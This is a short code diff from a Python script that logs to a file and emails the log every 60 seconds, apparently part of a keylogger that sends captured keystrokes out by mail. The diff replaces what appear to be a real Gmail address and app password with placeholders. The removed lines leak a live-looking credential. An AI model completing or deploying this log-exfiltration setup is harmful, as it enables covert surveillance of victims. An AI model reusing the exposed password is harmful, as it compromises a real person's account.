@@ -9,8 +9,9 @@ import time
 logging.basicConfig(filename="log.txt", level=logging.DEBUG, format="%(message)s", filemode="a")
 
 # Set your email and app password
-email = "saranpaul2005@gmail.com"
-password = "pdwn pbfb fzbq ykuz"
+email = "ENTER YOUR MAIL ID"
+# TO SET YOUR PASSWORD GO README......
+password = "ENTER YOUR PASSWORD"
 
 # Set the interval for sending logs via email (in seconds)
 log_interval = 60  # Send email every 60 seconds
